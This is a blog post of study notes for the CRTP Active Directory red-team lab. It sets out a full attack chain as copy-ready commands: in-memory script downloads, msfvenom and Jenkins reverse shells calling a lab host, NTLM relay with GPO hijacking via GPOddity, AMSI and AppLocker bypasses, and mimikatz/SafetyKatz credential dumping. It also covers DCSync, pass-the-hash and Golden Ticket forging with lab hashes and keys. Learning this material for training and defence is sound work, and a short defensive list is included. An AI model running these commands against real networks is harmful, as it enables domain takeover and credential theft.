---
title: "CRTP Notes: Breaking Down dollarcorp.moneycorp.local"
date: 2026-10-25
tags: [active-directory, red-team, crtp, kerberos, windows]
---

# CRTP Review and Field Notes

I went through the CRTP (Certified Red Team Professional) lab a while back, and instead of letting my scratch notes rot in a folder, I'm cleaning them up and putting them here. If you're prepping for the exam or just want a refresher on how an AD attack path actually strings together in Altered Security's `dollarcorp.moneycorp.local` lab, this should save you some time.

A couple of things before we dive in. First, this isn't a "here's every PowerView cmdlet" dump — there are cheat sheets for that already (I've linked two good ones below). This is closer to how I actually worked through the objectives, including the dead ends and the "oh, that's why it didn't work" moments. Second, every hash, SID, and password you'll see further down came out of the training lab itself, not a real client environment — the lab is shared infrastructure that thousands of students have already poked at, so none of it is sensitive.

References I kept coming back to:

- CRTP Notes repo: https://github.com/sec-fortress/CRTP-Notes/tree/main
- Companion notes: https://hackmd.io/@michellenovenda/S1bBSXdckl

---

## Getting comfortable with offensive PowerShell first

Before touching AD at all, it's worth being fluent in how you get code running and how you're being watched while you do it.

**Loading tooling.** You'll mostly do one of two things — dot-source a script to pull its functions into your current session:

```powershell
. C:\Users\inferno\Desktop\powerview.ps1
```

or import it as a proper module (a module really is just a packaged-up set of functions):

```powershell
Import-Module C:\Users\inferno\Desktop\ActiveDirectory.psd1
```

Once it's loaded, `Get-Command -Module <module_name>` tells you everything it exposes.

**Pulling scripts in-memory.** For remote execution without touching disk, the classic is:

```powershell
IEX (New-Object Net.WebClient).DownloadString('https://x.x.x.x/evil.ps1')
```

`Invoke-Expression` just runs a string as PowerShell code — [docs here](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/invoke-expression?view=powershell-7.6) if you've never read through them.

**What's watching you.** This is the part people skip and then get surprised in the exam/real engagement. Three things to keep in your head at all times:

| Mechanism | What it does |
| --- | --- |
| System-wide transcription | Logs every command and its output, for every PowerShell session |
| Script Block Logging | Logs the de-obfuscated content of whatever script block actually ran ([Splunk's writeup](https://www.splunk.com/en_us/blog/security/hunting-for-malicious-powershell-using-script-block-logging.html) is a good primer) |
| AMSI | Sits in front of execution and hands your script content to whatever AV/EDR is registered — basically a parser bolted onto the antivirus engine ([MS docs](https://learn.microsoft.com/en-us/windows/win32/amsi/antimalware-scan-interface-portal), [background on bypassing it](https://medium.com/@R3dLevy/evading-windows-security-bypass-amsi-65d639e2f35d)) |

Keep these in mind for literally everything that follows — half of the "evasive" tooling you'll see later exists purely to dodge this table.

---

## Enumerating the domain

Two tools do the heavy lifting here: the built-in **AD Module** (Microsoft-signed, so it's the stealthier pick since it's expected to be there) and **PowerView**, which is built on top of it but does a lot more.

```powershell
Import-Module .\PowerView.ps1
Get-Module    # sanity check it actually loaded
```

**Domain-level info first:**

```powershell
Get-Domain
Get-DomainController -Domain moneycorp.local
Get-DomainPolicy          # password policy - check this before you even think about spraying
```

**Then users, computers, groups:**

```powershell
Get-DomainUser | select <properties>
Get-DomainUser -Properties samaccountname

Get-DomainComputer

Get-DomainGroupMember -Identity "Domain Admins"
Get-DomainGroup -UserName "student421"        # which groups does this user belong to?
```

For share hunting at scale, NetSPI's [PowerHuntShares](https://github.com/NetSPI/Powerhuntshares) is worth having in your kit.

**Automated collection.** At some point you stop doing this by hand and let BloodHound chew on the graph for you. SharpHound is the standard collector (LDAP queries); SoapHound is the quieter option since it rides ADWS instead:

```powershell
# SharpHound
Loader.exe -Path .\SharpHound.exe
```

```powershell
# SoapHound - stealthier, uses ADWS instead of LDAP
SoapHound.exe --bhdump -o bloodhound-out.txt --nolaps
```

**How this actually played out in the lab.** Enumerating a single user:

```powershell
Get-DomainUser -Properties samaccountname -Identity student421
```

All computers in the domain:

```powershell
Get-DomainComputer
```

Tracking down Domain Admins meant starting from the built-in **Administrators** group, which resolved to the `Administrator` user plus the **Enterprise Admins** and **Domain Admins** groups. The twist — Enterprise Admins actually lives in the **parent** domain, so querying it means specifying that context explicitly:

```powershell
Get-DomainGroup -Identity "Enterprise Admins" -Domain moneycorp.local
```

This is one of those things that trips people up on the exam: being in a child domain does not hand you that parent group's membership for free. You have to go ask for it in the parent's context.

The lab flag I landed on here: `S-1-5-21-335606122-960912869-3279953914-500`

---

## ACL enumeration — where most privesc paths actually live

```powershell
Get-DomainObjectAcl -SamAccountName student421 -ResolveGUIDs

Get-DomainObjectAcl -SearchBase "LDAP://CN=Domain Admins,CN=Users,DC=..." -ResolveGUIDs -Verbose
```

If you want the fast path, skip straight to:

```powershell
Find-InterestingDomainAcl
```

It surfaces every ACE worth looking twice at in one pass. Cavementech has a [solid ACL abuse primer](https://notes.cavementech.com/pentesting-quick-reference/active-directory-pentesting/active-directory/access-control-list-abuse-primer/acl-enumeration) if you want the theory behind why these matter.

**Reading an ACE is pattern-matching once you get it:** security principal X has `ActiveDirectoryRights` Y over object DN Z. To turn a SID into something readable:

```powershell
ConvertFrom-SID "S-1-5-21-719815819-3726368948-3917688648-517" -Domain dollarcorp.moneycorp.local
# -> dcorp\Cert Publishers
```

One finding from the lab that's a good example of "this shouldn't exist but does": **Cert Publishers** had `ReadProperty`/`WriteProperty` on the Domain Admins group object.

**Targeting your search.** Where does `student421` have interesting rights?

```powershell
Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match "student421"}
```

Same question for the `RDPUsers` group:

```powershell
Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match "RDPUsers"}
```

Or resolve the SID up front and filter on a specific target object directly:

```powershell
$sid = Convert-NameToSid "RDP Users"
Get-DomainObjectAcl -Identity "Control421User" -ResolveGUIDs | ?{$_.SecurityIdentifier -eq $sid}
```

This one surfaced `RDP Users` holding `GenericAll` over `Control421User` — full control, trivial account takeover the moment you spot it.

---

## OUs and GPOs

Background reading if GPO internals are new to you: [intro to GPOs](https://blog.deephacking.tech/en/posts/introduction-to-group-policy-objects-gpo-active-directory).

**OUs:**

```powershell
Get-DomainOU                                   # all OUs
Get-DomainOU -Identity "DevOps"                # filter by name
(Get-DomainOU -Identity "DevOps").distinguishedname | %{Get-DomainComputer -SearchBase $_}   # what's inside it
```

**GPOs:**

```powershell
Get-DomainGPO                                              # all GPOs
Get-DomainGPO | ?{$_.displayname -match "DevOps"}          # filter by name
Get-DomainGPO | Where-Object displayname -match "DevOps"   # same thing, different syntax

# who has rights on this GPO?
Get-DomainGPO | Where-Object displayname -match "DevOps" | Get-DomainObjectACL

# resolve those SIDs to names
Get-DomainGPO | Where-Object displayname -match "DevOps" | Get-DomainObjectACL | ForEach-Object {ConvertFrom-SID $_.SecurityIdentifier}
```

Hang onto this — the GPO abuse chain later in this post is basically this enumeration plus a few more steps.

---

## Trusts: the part that makes AD pentesting interesting

This table is the one I referenced constantly, so I'm keeping it close to how I originally wrote it:

| Trust Type | Transitivity | Direction | SID Filtering (default) | Offensive Value |
| --- | --- | --- | --- | --- |
| Parent–Child | Automatic, transitive | Bidirectional | **OFF** (intra-forest) | Child DA → Enterprise Admin on parent via trust-key abuse |
| Tree-Root | Automatic, transitive | Bidirectional | **OFF** (intra-forest) | Same trust-key abuse path as parent–child |
| Forest Trust | Transitive between the two linked forests only — doesn't chain to a third forest | Configurable (one-way or bidirectional) | **ON** by default | Need a misconfigured quarantine/selective-auth gap, or legitimately granted cross-forest access |
| External | Non-transitive, only the two named domains, never reaches their children | Configurable | Historically **OFF**, always verify | Often legacy and forgotten — high priority for recon |

The rule of thumb I kept in my head during the exam: `WITHIN_FOREST` trusts (parent–child, tree-root) mean no SID filtering, which is the easiest escalation path you'll find. Forest and external trusts need their `TrustAttributes` checked before you assume a forged ticket will even be accepted — don't skip that check and waste time forging something that was never going anywhere.

### Child → parent: the centerpiece attack of the course

**You need this precondition first:** Domain Admin in a child domain.

**Why it works at all:** every trust relationship is backed by a trust key, derived from the inter-domain trust account (e.g. `dollarcorp$`). Because SID filtering isn't enforced on intra-forest trusts, a forged ticket carrying a foreign SID — say, the parent's Enterprise Admins SID — gets accepted without question.

Steps, in order:

1. Dump the trust key from the child DC:

```
mimikatz # lsadump::trust /patch
```

2. Grab the child domain's SID and the parent's Enterprise Admins SID:

```powershell
Get-DomainSID
Get-DomainGroup -Identity "Enterprise Admins" -Domain parent.local
```

3. Forge an inter-realm TGT using the trust key, stuffing the parent's Enterprise Admins SID into it:

```
mimikatz # kerberos::golden /user:Administrator /domain:child.local /sid:<child-domain-sid> /sids:<parent-EA-sid> /rc4:<trust-key> /service:krbtgt /target:parent.local /ticket:trust_ticket.kirbi
```

4. Use that ticket to request a TGS against the parent. The parent DC validates it, sees the injected EA SID sitting in the PAC, and hands you Enterprise Admin.

End result: one compromised child domain turns into the entire forest. This is the moment the course clicks for most people.

**Trust enumeration, the checklist version:**

```powershell
Get-DomainTrust                 # trusts from your current context
Get-DomainTrustMapping          # the whole forest trust topology
Get-ForestTrust                 # forest-level trust objects
Get-ForestDomain                # every domain in the forest
Get-DomainForeignUser           # users with foreign group memberships
Get-DomainForeignGroupMember    # groups containing foreign principals
```

Always, always check `TrustDirection`, `TrustType`, and `TrustAttributes` on whatever comes back — that's what tells you a path is theoretically usable before you waste time trying it.

---

## Local privilege escalation, Windows edition

### Token privileges you should recognize on sight

Run `whoami /priv` and scan for these:

| Privilege | What it buys you |
| --- | --- |
| `SeImpersonatePrivilege` / `SeAssignPrimaryTokenPrivilege` | The classic. Common on service accounts (IIS, SQL). Potato-family attacks (JuicyPotato, RoguePotato, PrintSpoofer, GodPotato — pick based on build) coerce a SYSTEM token out of it. |
| `SeBackupPrivilege` / `SeRestorePrivilege` | Read/write any file, ACLs be damned. Dump SAM/SYSTEM hives or `ntds.dit` (`reg save hklm\sam`, `robocopy /b`) and crack offline. |
| `SeTakeOwnershipPrivilege` | Take ownership of literally any object — service, file, registry key — regardless of the current ACL, then grant yourself full control. |
| `SeDebugPrivilege` | Open a handle to any process, SYSTEM ones included, which is how you get at `lsass.exe` for credential dumping. |
| `SeLoadDriverPrivilege` | Load a kernel driver. Pair with a vulnerable signed driver (BYOVD) for kernel-level code exec. |
| `SeTcbPrivilege` | "Act as part of the OS." Extremely powerful — effectively lets you forge any token. |

### Service misconfigurations

Three flavors show up constantly: unquoted service paths, weak service permissions (`SERVICE_CHANGE_CONFIG` on a SYSTEM service), and weak filesystem permissions on the binary itself.

**Unquoted service paths, worked through.** Given a service path like:

```
C:\WebServer\Abyss Web Server\abyssws.exe -service
```

Windows tries each space-delimited segment as a standalone executable, in order:

1. `C:\WebServer\Abyss.exe`
2. `C:\WebServer\Abyss Web.exe`
3. `C:\WebServer\Abyss Web Server\abyssws.exe` ← the actual binary

Drop a file at position 1 or 2 and it runs instead, inheriting whatever the service account's privileges are — often `LocalSystem`.

Finding candidates:

```powershell
Get-WmiObject -Class win32_service | select Name, PathName, StartMode | where {$_.PathName -notmatch '"' -and $_.PathName -match ' '}

# PowerUp
Get-UnquotedServicePath
```

(winPEAS flags these automatically too, if that's in your toolkit.)

Confirming write access on the candidate directory:

```cmd
icacls "C:\WebServer\"
icacls "C:\WebServer\Abyss Web Server\"
```

or

```powershell
Get-Acl "C:\WebServer\" | fl
```

Look for `(M)`/`(W)`/`(F)` against your own user or group — and pay extra attention when it's `Everyone`, `Users`, or `Authenticated Users` holding that access.

Confirm you can actually control the service:

```cmd
sc qc <ServiceName>
accesschk.exe -ucqv <ServiceName>
```

Then drop the payload and (re)start it:

```cmd
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<you> LPORT=<port> -f exe -o Abyss.exe
```

### AlwaysInstallElevated

Check both registry keys:

```
HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated
HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated
```

Both set to `1` means any user can install an `.msi` with SYSTEM privileges:

```cmd
msfvenom -f msi -o payload.msi ...
msiexec /i payload.msi
```

### Other avenues worth checking

- **Scheduled tasks** — if a SYSTEM-run task calls something you can write to, or lives in a weak-permission folder, you can edit it directly. `schtasks /query /fo LIST /v` is where you start.
- **DLL hijacking** — if a privileged process loads a DLL without specifying the full path, Windows walks a defined search order. Plant a malicious DLL earlier in that order than the real one, and it loads in that process's context instead.
- **Stored creds / autologon** — `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon` sometimes still has a plaintext `DefaultPassword` sitting in it. Unattended install files (`unattend.xml`, `sysprep.inf`) are another classic. Also worth checking: saved RDP/PuTTY/WinSCP sessions, browser-saved creds, and `cmdkey /list` for cached credentials. PowerUp, PrivescCheck, and winPEAS will all surface most of this automatically.
- **Jenkins** — admin access to `http://jenkins-server/script` gives arbitrary script execution. Even without console access, a build config running Windows batch commands gets you the same place.
- **Relaying** — NTLM and Kerberos relaying come up constantly; see the GPO abuse walkthrough below for a full worked example.

### How this played out on the student VM

Running PowerUp's `Invoke-AllChecks` surfaced a modifiable service file, an unquoted service path, and a DLL hijack vector in one pass. I went with the modifiable service file — swap in a payload binary matching the real one's name, or let PowerUp's built-in service-abuse commands do it for you. [This writeup](https://medium.com/r3d-buck3t/privilege-escalation-with-insecure-windows-service-permissions-5d97312db107) covers the theory well if you want more depth.

Finding machines where a given user has local admin:

```powershell
Find-PSRemotingLocalAdminAccess
```

And for Jenkins specifically — default creds didn't work, but "same password as the username" did, against local (non-domain) Jenkins accounts. Worth noting: that's safe from DC lockout since the auth never traverses the DC. Once in, creating a project and running a reverse shell was straightforward:

```powershell
powershell.exe -c "iex (iwr http://172.16.100.21/Invoke-PowerShellTcp.ps1 -UseBasicParsing); Power -Reverse -IPAddress 172.16.100.21 -Port 443"
```

---

## Lateral movement

### GPO abuse — probably my favorite chain in the whole lab

**The core idea:** excessive rights over a GPO — `WriteDACL`, `WriteProperty`, `GenericWrite`, or outright edit access — let you weaponize it to push commands or scheduled tasks to every machine or user the GPO applies to. Depending on scope, that can land you straight on local admin or DA.

**Why it's possible at all:** a `WriteDACL` flaw on a GPO lets you grant yourself edit rights. From there, editing the GPO's backing files on SYSVOL (or spoofing where it points) lets you inject a malicious scheduled task. The next time a target refreshes its GPOs — default is roughly 90 minutes, though you can force it — your payload runs as SYSTEM or in the local machine context.

Here's the chain exactly as I ran it in the lab:

**1. The recon that kicked it off.** A world-readable `\\dcorp-ci\AI` share had a log showing that any `.lnk` file dropped into it gets auto-executed as `devopsadmin`. Enumerating from there showed `devopsadmin` holding `WriteDACL` on the `DevOps Policy` GPO.

**2. Set up an NTLM relay** (ran this from WSL):

```bash
sudo ntlmrelayx.py -t ldaps://172.16.2.1 -wh 172.16.100.x --http-port '80,8080' -i --no-smb-server
```

Quick rundown of the flags: `-t ldaps://<DC>` is the relay target (LDAPS, since the goal is manipulating AD objects/DACLs), `-wh` sets the WPAD host for auth coercion, `-i` spins up an interactive LDAP shell on success, and `--no-smb-server` skips the SMB listener so it doesn't fight with anything already bound to port 80 (HFS, in my case — I had to close that first).

**3. Craft the coercion payload** — a `.lnk` shortcut pointing at:

```
C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -Command "Invoke-WebRequest -Uri 'http://172.16.100.X' -UseDefaultCredentials"
```

Dropped into the writable automation folder:

```cmd
xcopy C:\AD\Tools\studentx.lnk \\dcorp-ci\AI
```

The automation picks it up and executes as `devopsadmin`, whose auth then relays straight to the `ntlmrelayx` listener.

**4. Catch the LDAP shell:**

```bash
nc 127.0.0.1 11000
```

Grant your own user `WriteDACL` on the target GPO:

```
write_gpo_dacl studentx {GPO-GUID}
```

(If you don't have a domain user to use, create a rogue computer account first and do the same thing to it instead: `add_computer stdX-gpattack Secretpass@123` then `write_gpo_dacl stdX-gpattack$ {GPO-GUID}`.)

**5. Weaponize it with GPOddity:**

```bash
sudo python3 gpoddity.py \
  --gpo-id '{GPO-GUID}' \
  --domain 'dollarcorp.moneycorp.local' \
  --username 'studentx' --password '<pwd>' \
  --command 'net localgroup administrators studentx /add' \
  --rogue-smbserver-ip '172.16.100.x' \
  --rogue-smbserver-share 'stdx-gp' \
  --dc-ip '172.16.2.1' \
  --smb-mode none
```

What's happening under the hood: it pulls the legitimate GPT from SYSVOL so your clone looks normal, injects a scheduled task running your chosen command, bumps the GPO's `versionNumber` so clients treat it as changed, and — the actual hijack — rewrites `gPCFileSysPath` on the GPC object to point at a rogue share instead of real SYSVOL. Clients just fetch GPT content from wherever that path says to look.

**6. Host the rogue share:**

```bash
mkdir /mnt/c/AD/Tools/stdx-gp
cp -r /mnt/c/AD/Tools/GPOddity/GPT_Out/* /mnt/c/AD/Tools/stdx-gp
```

From an elevated prompt:

```cmd
net share stdX-gp=C:\AD\Tools\stdX-gp /grant:Everyone,Full
icacls "C:\AD\Tools\stdX-gp" /grant Everyone:F /T
```

**7. Verify the hijack landed:**

```powershell
Get-DomainGPO -Identity 'DevOps Policy'
```

`gpcfilesyspath` should now point at `\\172.16.100.X\stdX-gp` instead of the real SYSVOL UNC path.

**8. Wait for the refresh** (about two minutes in the lab) and confirm:

```cmd
winrs -r:dcorp-ci cmd /c "set computername && set username"
```

Got back `USERNAME=studentx` in a local-admin-capable context on `dcorp-ci`. Objective done.

**What I took away from this one:**

- `WriteDACL` on a GPO is functionally the same risk as having direct edit rights — it just means you grant yourself those rights first.
- GPO content isn't validated against the real SYSVOL path by default. `gPCFileSysPath` is just a pointer, and nothing stops you from redirecting it to an attacker-hosted SMB share.
- Relaying a privileged account's auth through a coerced automation execution gets you write access without ever touching that account's actual password.
- GPOddity does the annoying parts (cloning a convincing GPT, injecting the task, updating `gPCFileSysPath`/`versionNumber`/`extensionName`) automatically.

**And from the defensive side**, since it's worth thinking about both ways:

- Audit GPO DACLs for non-admin principals sitting on `WriteDACL`/`WriteProperty`/`GenericWrite`.
- Alert on `gPCFileSysPath` changes pointing outside the domain's real SYSVOL path.
- Lock down write access on any share where automation executes files as a privileged account.
- Kill NTLM where you can, and enforce SMB/LDAP signing plus channel binding to blunt relay attacks generally.
- Synacktiv's [original GPOddity writeup](https://www.synacktiv.com/publications/gpoddity-exploiting-active-directory-gpos-through-ntlm-relaying-and-more) is worth reading in full.

### PS Remoting, WinRS, and getting at credentials

**PSRemoting vs. WinRS** — both ride WS-Man (WinRM) over the same default ports, 5985 for HTTP and 5986 for HTTPS, but they don't behave identically from an OPSEC standpoint:

|  | `Enter-PSSession` | `winrs` |
| --- | --- | --- |
| Logging | Detailed Windows event log entries | Similar, but generally less detailed |
| EDR visibility | Highly visible — tightly coupled to PowerShell monitoring, transcription, script block logging | Less commonly monitored in practice |
| Network detection | Same protocol, broadly similar | Same protocol, broadly similar |

`Enter-PSSession -ComputerName PC1` runs as a high-integrity process, so you skip UAC friction entirely. `winrs -r:PC1 powershell` is the more OPSEC-conscious alternative when that matters.

**On LSASS specifically** — LSA handles Windows authentication, and LSASS is the service behind it. It holds NT hashes, AES keys, and Kerberos tickets any time someone logs on locally or via RDP, uses RunAs, runs a service, runs a scheduled task, or connects via a remote admin tool.

Worth internalizing: LSASS is simultaneously the single most useful process on a host and the single most watched one. Before you touch it directly, remember credentials are also sitting in:

- The **SAM hive** (registry) — local account credentials
- **LSA Secrets / the SECURITY hive** — service account passwords, domain cached credentials, and more
- **DPAPI-protected data on disk** — Credential Manager/Vault, browser cookies, certificates, Azure tokens

**Mimikatz / SafetyKatz**, once you do go there ([good OPSEC background here](https://itm8.com/articles/mimikatz-under-the-hood)):

```cmd
mimikatz.exe "sekurlsa::ekeys"
SafetyKatz.exe "sekurlsa::ekeys"
```

With AES/RC4 keys extracted, pass-the-hash:

```cmd
SafetyKatz.exe "sekurlsa::pth /user:administrator /domain:dollarcorp.moneycorp.local /aes256:<aes256key> /run:cmd.exe" "exit"
```

(Rubeus can pull credentials too, if that's already the tool you've got loaded.)

**DCSync deserves a special mention** since it's the stealthier route to DC secrets — no code execution on the DC itself required, just a replication request. You need DA, or explicitly delegated replication rights, to pull it off:

```cmd
SafetyKatz.exe "lsadump::dcsync /user:dcorp\krbtgt" "exit"
```

### Chaining it all together to reach DA

The actual objective here was multi-stage: find a box with an active DA session, compromise it, and escalate — first through `dcorp-ci`, then derivative local admin through `dcorp-adminsrv`, dealing with AppLocker gaps along the way.

Here's how the progress actually stacked up in the lab:

- Local admin landed on `dcorp-student421`.
- `Find-PSRemotingLocalAdminAccess` confirmed local admin over `dcorp-adminsrv`.
- Jenkins abuse got local admin on `dcorp-ci`.
- The GPO abuse chain above added `student421` to Local Admins on `dcorp-ci`.

**Phase 1 — hunting for sessions.** SessionHunter doesn't need admin rights on the targets (it talks to Remote Registry):

```powershell
Invoke-SessionHunter -NoPortScan -RawResults -Targets .\servers.txt | Select-Object Hostname,UserSession,Access
```

`-NoPortScan` skips the pre-check when you already know the hosts are up, `-RawResults` gives you unformatted data to filter however you want, and `-Targets` taking a file of FQDNs keeps the sweep targeted instead of scanning blind — good practice against things like Microsoft Defender for Identity.

PowerView's `Find-DomainUserLocation` is a useful cross-check, though it needs the executing user to already have local admin on whatever it's querying (it relies on `NetSessionEnum`):

```powershell
Find-DomainUserLocation -UserGroupIdentity "Domain Admins"
```

This is what surfaced the key finding: an active `svcadmin` (Domain Admin) session sitting on `dcorp-mgmt`.

**Phase 2 — pivoting through dcorp-ci.** With the reverse shell from Jenkins in hand, and after bypassing AMSI and script block logging, `Find-DomainUserLocation` confirmed session locations. `Loader.exe` got deployed to `dcorp-ci`, then copied over SMB to `dcorp-mgmt`'s admin share. A port proxy routed the payload download through a less-watched port:

```cmd
$null | winrs -r:dcorp-mgmt "netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.21"
```

SafetyKatz's evasive key dump (`sekurlsa::evasive-keys`) then pulled `svcadmin`'s AES256 key and NTLM hash, in-memory.

**Phase 3 — OverPass-the-Hash.** With Rubeus, from the student VM:

```powershell
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args "asktgt /user:svcadmin /domain:dcorp /aes256:<KEY> /dc:dcorp-dc /ptt"
```

This requests a TGT and injects it directly (`/ptt`) into the local session — straight into a Domain Admin context against the DC.

There's also a direct NTLM route for the same outcome:

```cmd
sekurlsa::pth /user:appadmin /domain:dollarcorp.moneycorp.local /ntlm:d549831a955fee51a43c83efb3928fa7 /run:powershell.exe
```

**Phase 4–5 — AppLocker and Constrained Language Mode on dcorp-adminsrv.** Local admin there was confirmed with `Find-PSRemotingLocalAdminAccess.ps1`, but PSRemoting drops you into Constrained Language Mode, and AppLocker blocks `.exe` execution from user-writable folders like `C:\Users\Public`. Checking the effective policy:

```cmd
reg query HKLM\Software\Policies\Microsoft\Windows\SRPV2
```

```powershell
Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
```

**The gap that mattered:** default rules let *Everyone* (`S-1-1-0`) run scripts and binaries out of `%PROGRAMFILES%\*` and `%WINDIR%\*`.

Executing under CLM without dot-sourcing or `iex` means hardcoding the call directly into the script body:

1. Copy a template script (e.g. `Invoke-TheKat.ps1`) to a new file.
2. Append the function call and payload invocation straight onto the end of the script — no dynamic invocation allowed, so it has to already be baked in.
3. Move it into an allowed directory via `Copy-Item`.
4. Run it directly: `C:\Program Files\script.ps1`.

In the lab, this meant copying `Invoke-TheKat.ps1` to `Invoke-TheKatEx-keys-stdX.ps1`, appending obfuscated `token::evasive-elevate` and `sekurlsa::evasive-ekeys` calls, dropping it into `C:\Program Files\` on `dcorp-adminsrv`, and running it — which harvested `appadmin`, `websvc`, and `srvadmin` credentials. Swapping the trailing command to `vault::cred /patch` instead dumped the Windows Credential Vault and recovered a plaintext password for `srvadmin`.

**Phase 6 — just disabling AppLocker via GPO.** When the current user has `GenericAll`/`Full Control` over the AppLocker GPO itself, there's a much more direct route:

```cmd
runas /user:dcorp\studentx /netonly cmd
gpmc.msc
```

Navigate `Policies → Windows Settings → Security Settings → Application Control Policies → AppLocker`, delete the restrictive Executable Rules, then force a refresh on the target:

```powershell
winrs -r:dcorp-adminsrv gpupdate /force
```

Result: AppLocker is fully off on `dcorp-adminsrv`, and `Loader.exe`/`SafetyKatz` run anywhere, including `C:\Users\Public\`.

**The full lateral pivot summary, start to finish:** `srvadmin` creds (via `runas /netonly`) → found local admin on `dcorp-mgmt` → pulled `svcadmin`'s AES256 key with SafetyKatz → used that key for OverPass-the-Hash straight to DA.

A few things worth remembering for the exam specifically: AppLocker bypasses usually come down to misconfigured path rules (scripts/binaries permitted under `%PROGRAMFILES%`); CLM blocks dynamic script execution (`iex`, dot-sourcing, reflection), so you're stuck with pre-compiled or hardcoded-at-the-end scripts; and a low-priv user with modification rights over a domain GPO can alter security configuration — disabling AppLocker included — entirely through legitimate tooling like `gpmc.msc`.

---

## Domain dominance

Once you've got DA, the game shifts. Now it's about persistence, pushing to Enterprise Admin, and abusing whatever trusts are misconfigured — almost all of it built on Kerberos ticket abuse.

### Kerberos, briefly

Kerberos is the authentication service the KDC (Key Distribution Center) runs, responsible for issuing the tickets every domain client relies on to authenticate. If you want the deep dive, [this is a good one](https://en.hackndo.com/kerberos/).

### Golden Ticket

Powerful, but loud — not something you reach for if OPSEC matters.

Every TGT is normally built around the `krbtgt` account's secret key. Get that key, and you can forge a TGT locally — skipping the KDC entirely — then use it directly to request service tickets.

Getting the `krbtgt` hash requires DA first:

```cmd
C:\AD\Tools\Safetykatz.exe "lsadump::lsa /patch"
```

Or pull the AES keys via DCSync instead, with no code execution needed on the DC:

```cmd
C:\AD\Tools\Safetykatz.exe "lsadump::dcsync /user:dcorp\krbtgt" "exit"
```

**Why bother with a Golden Ticket instead of just using the account you already dumped?** Because the Golden Ticket is signed and encrypted with `krbtgt`'s hash specifically — that's what makes it a *valid* TGT accepted anywhere in the domain, letting it impersonate any user with any privileges, from any machine, domain-joined or not. If you're remediating this, the standard advice is to rotate `krbtgt`'s password **twice**, since password history is retained for one generation back.

Forging with Rubeus:

```cmd
C:\AD\Tools\Rubeus.exe golden /aes256:154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848 /sid:S-1-5-21-719815819-3726368948-3917688648 /ldap /user:Administrator /printcmd
```

The `/ldap` flag has Rubeus query the DC directly for the user's flags, groups, `pgid`, min/max password age, and the domain's NetBIOS name. If you already know these from earlier enumeration, specifying them manually is the more OPSEC-friendly move — fewer LDAP queries to leave a trail.

**Worked example** — grabbing a TGT for `svcadmin` after dumping its secret from `dcorp-mgmt`:

```cmd
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgt /user:svcadmin /aes256:6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011 /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
```

or with the NT hash instead:

```cmd
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgt /user:svcadmin /rc4:b38ff50264b74508085d82c69794a4d8 /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
```

**On hash and key types** — worth having straight, since mixing these up costs time:

| Type | Notes |
| --- | --- |
| NT hash (NTLM) | MD4 of the UTF-16LE password, unsalted, 32 hex characters. Used directly as the RC4-HMAC Kerberos key and for NTLM pass-the-hash. Weak, since unsalted means offline cracking/rainbow tables are entirely feasible. |
| RC4-HMAC (etype 0x17) | A Kerberos encryption type, not a hash itself — it uses the NT hash *as* the key, which is exactly why having an NT hash alone enables OverPass-the-Hash. Legacy (the default pre-Vista/2003); an RC4 AS-REQ/TGS-REQ from a modern client tends to stick out in logs (events 4768/4769 showing `0x17`). |
| AES256-HMAC (etype 0x12) | A separate, independent encryption type. The key derives from the plaintext password plus salt (principal + realm) through PBKDF2-like iterations — it's **not** derivable from the NT hash. This has been the modern default since Server 2008/Vista+. Getting it means you need the plaintext password, or a dump that specifically captures the AES key — LSASS, or NTDS.dit with the right tooling. A plain NTLM dump won't get you there. |

**A full DC dump, end to end, the way I ran it:**

1. Confirm DC access:

```cmd
winrs -r:dcorp-dc cmd /c "set username && set computername"
```

2. Upload the loader:

```cmd
echo F | xcopy .\Loader.exe \\dcorp-dc\C$\Users\Public\Loader.exe
```

3. Port-forward 8080 to 80 so the payload download doesn't trip an external-fetch flag:

```cmd
$null | winrs -r:dcorp-dc "netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.21"
```

4. Connect and run against the local proxy:

```cmd
winrs -r:dcorp-dc cmd
Loader.exe -Path 127.0.0.1:8080/SafetyKatz.exe
```

5. Dump every domain user's NT hash:

```cmd
lsadump::evasive-lsa /patch
```

6. DCSync `krbtgt`'s secrets specifically:

```cmd
lsadump::evasive-dcsync /user:dcorp\krbtgt
```

7. Generate the forging command, then run it with `/ptt` to inject straight into the current session:

```cmd
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args evasive-golden /aes256:154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848 /sid:S-1-5-21-719815819-3726368948-3917688648 /ldap /user:Administrator /printcmd

C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args Evasive-Golden /aes256:154CB6624B1D859F7080A6615ADC488F09F92843879B3D914CBCB5A8C3CDA848 /user:Administrator /id:500 /pgid:513 /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948-3917688648 /pwdlastset:"11/11/2022 6:34:22 AM" /minpassage:1 /logoncount:3133 /netbios:dcorp /groups:544,512,520,513 /dc:DCORP-DC.dollarcorp.moneycorp.local /uac:NORMAL_ACCOUNT,DONT_EXPIRE_PASSWORD /ptt
```

**Why bother forging a Golden Ticket when you're already standing on the DC with DA?** Because DA access is temporary by nature:

1. Active accounts can be reset or disabled at any point — access through `svcadmin` or the built-in `Administrator` account dies the second someone rotates a password.
